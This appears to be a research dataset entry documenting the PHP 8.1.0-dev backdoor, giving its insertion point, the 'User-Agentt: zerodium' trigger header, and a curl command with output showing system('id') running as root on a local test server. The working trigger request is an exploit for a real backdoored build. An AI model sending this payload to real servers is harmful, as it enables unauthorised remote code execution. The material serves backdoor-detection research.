# PHP 8.1.0-dev backdoor

- **Type**: hidden command, hardcoded credentials
- **Affected versions**: 8.1.0-dev (illegitimate commits)
- **Previous version**: 8.0.30
- **Insertion-point function**: `php_zlib_output_compression_start`
- **Insertion-point addr (OXIDE)**: "3062032"

## Behavior

This sample introduces a command-execution backdoor that activates only when specific trigger conditions are satisfied.

Trigger materials:

- Exact trigger: HTTP header `User-Agentt: zerodium<PHP_CODE>`.

Payload:

- Exact effect: PHP code execution.

## Triggering

First, we need to start up the HTTP server (e.g., with the _backdoored_ variant):

```console
$ ./backdoored/sapi/cli/php -S 127.0.0.1:8080 -t ./www
```

In a separate terminal, we can trigger the backdoor via a simple HTTP request:

```console
$ curl -v -H "User-Agentt: zerodiumsystem('id');" http://localhost:8080
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* connect to ::1 port 8080 from ::1 port 35680 failed: Connection refused
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.5.0
> Accept: */*
> User-Agentt: zerodiumsystem('id');
>
< HTTP/1.1 200 OK
< Host: localhost:8080
< Date: Thu, 12 Dec 2024 09:24:16 GMT
< Connection: close
< X-Powered-By: PHP/8.1.0-dev
< Content-type: text/html; charset=UTF-8
<
uid=0(root) gid=0(root) groups=0(root)
* Closing connection
```

## Reference

<https://doi.org/10.1145/3577923.3583657>
